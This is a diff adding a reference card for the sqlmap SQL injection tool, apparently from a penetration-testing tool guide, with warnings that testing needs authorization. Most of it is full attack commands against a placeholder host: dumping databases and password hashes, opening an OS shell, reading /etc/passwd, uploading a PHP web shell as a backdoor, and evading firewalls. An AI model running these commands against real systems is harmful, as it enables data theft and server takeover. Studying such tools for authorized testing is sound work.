@@ -1,0 +1,126 @@
+SQLmap
+Automatic SQL injection and database takeover tool
+
+Web Application
+Description
+SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It can detect various types of SQL injection and can access the database, dump data, and even get a shell on the server in some cases.
+
+Installation / Check
+Check if installed:
+
+which sqlmap
+Install command:
+
+sudo apt install sqlmap
+Basic Syntax
+sqlmap -u "<URL with parameter>" [options]
+Common Commands
+Command	What it does	When to use	Risk
+sqlmap -u "http://target.com/page?id=1"
+
+Basic test - Check if parameter is injectable	First injection test	
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+List databases - Show all databases	Enumerate databases	
+sqlmap -u "http://target.com/page?id=1" -D dbname --tables
+
+List tables - Show tables in database	Enumerate tables	
+sqlmap -u "http://target.com/page?id=1" -D db -T users --columns
+
+List columns - Show table structure	Find column names	
+sqlmap -u "http://target.com/page?id=1" -D db -T users --dump
+
+Dump table - Extract all data	Data extraction	
+sqlmap -u "http://target.com/page?id=1" --batch
+
+Batch mode - No user prompts	Automated testing	
+sqlmap -u "http://target.com/page?id=1" --forms
+
+Test forms - Auto-detect and test forms	Login/search forms	
+sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
+
+Max testing - All payloads, max risk	Thorough testing	
+sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
+
+All techniques - Try all injection types	Bypass WAF	
+sqlmap -u "http://target.com/page?id=1" --current-user
+
+Current DB user - Show database user	Check privileges	
+sqlmap -u "http://target.com/page?id=1" --current-db
+
+Current database - Show active DB	Quick DB check	
+sqlmap -u "http://target.com/page?id=1" --is-dba
+
+Check DBA - Is user admin?	Privilege check	
+sqlmap -u "http://target.com/page?id=1" --os-shell
+
+OS shell - Get system command shell	Full system access	
+sqlmap -u "http://target.com/page?id=1" --sql-shell
+
+SQL shell - Interactive SQL console	Direct DB queries	
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+
+Read file - Read server files	File disclosure	
+sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"
+
+Write file - Upload file to server	Backdoor upload	
+sqlmap -u "http://target.com/page?id=1" --passwords
+
+Dump passwords - Extract DB user hashes	Credential extraction	
+sqlmap -u "http://target.com/page?id=1" --dump-all
+
+Dump everything - Extract entire database	Full data extraction	
+sqlmap -r request.txt
+
+From Burp - Test captured request	Complex requests	
+sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
+
+With cookie - Test authenticated endpoint	Post-login testing	
+sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
+
+Through proxy - Route via Burp	Traffic analysis	
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
+
+WAF bypass - Use tamper script	Evade WAF filters	
+sqlmap -u "http://target.com/page?id=1" --random-agent
+
+Random User-Agent - Avoid detection	Stealth testing	
+sqlmap -u "http://target.com/page?id=1" --threads=10
+
+Multi-threaded - Faster scanning	Speed up testing	
+sqlmap -u "http://target.com/page?id=1" --dbms=mysql
+
+Specify DBMS - Target specific database	Known DB type	
+sqlmap -u "http://target.com/page?id=1" --time-sec=10
+
+Time delay - For time-based blind	Slow networks	
+Step-by-Step Guide
+1
+Find a URL with parameters (like ?id=1 or ?search=test)
+2
+Open terminal and run: sqlmap -u "URL" to test for injection
+3
+If vulnerable, SQLmap will show the injection type
+4
+Use --dbs to list available databases
+5
+Use -D dbname --tables to list tables
+6
+Use --dump to extract data (only on authorized targets!)
+7
+Review the output in the terminal or saved files
+Understanding the Output
+SQLmap shows injection type (Boolean-based, Time-based, UNION, etc.), database type (MySQL, PostgreSQL, etc.), and extracted data. Green [INFO] messages show progress, red [CRITICAL] shows errors.
+
+Important Warnings
+•
+SQL injection testing without permission is ILLEGAL
+•
+This tool can damage databases - use with extreme caution
+•
+Always have written authorization before testing
+•
+Data extraction from unauthorized systems is a crime
+•
+Use only on your own applications or with explicit permission
+⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
